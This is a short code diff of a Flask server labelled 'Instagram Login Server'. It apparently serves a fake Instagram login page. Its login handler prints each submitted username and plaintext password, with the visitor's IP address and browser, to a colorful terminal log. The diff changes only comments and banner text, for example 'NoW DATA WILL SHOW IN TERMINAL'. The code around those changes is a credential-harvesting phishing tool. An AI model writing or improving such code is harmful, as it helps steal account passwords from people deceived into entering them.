@@ -6,7 +6,7 @@ import string
 app = Flask(__name__)
 
 # ===================================================
-#   Terminal me colorful logs ke liye
+#   Terminal colorful logs 
 # ===================================================
 def log(msg, color="\033[0m"):
     timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
@@ -47,7 +47,7 @@ def login():
 
         # --- Log incoming data ---
         log_data(f"  Username  : \"{username}\"")
-        # >>> YAHAN CHANGE KIYA — ab saaf password dikhega <<<
+        # >>> NoW DATA WILL SHOW IN TERMINAL <<<
         log_data(f"  Password  : \"{password}\" ({len(password)} chars)")
         log_info(f"  IP        : {request.remote_addr}")
         log_info(f"  Browser   : {request.headers.get('User-Agent', 'Unknown')[:60]}...")
@@ -203,7 +203,7 @@ if __name__ == '__main__':
     print("  " + "━" * 55)
     print("  \033[96m   🚀 Instagram Login Server Running\033[0m")
     print("  \033[92m   ➜  http://localhost:8080\033[0m")
-    print("  \033[93m   Terminal me live logs dikhege\033[0m")
+    print("  \033[93m   Now Wath Logs\033[0m")
     print("  " + "━" * 55)
     print()
 
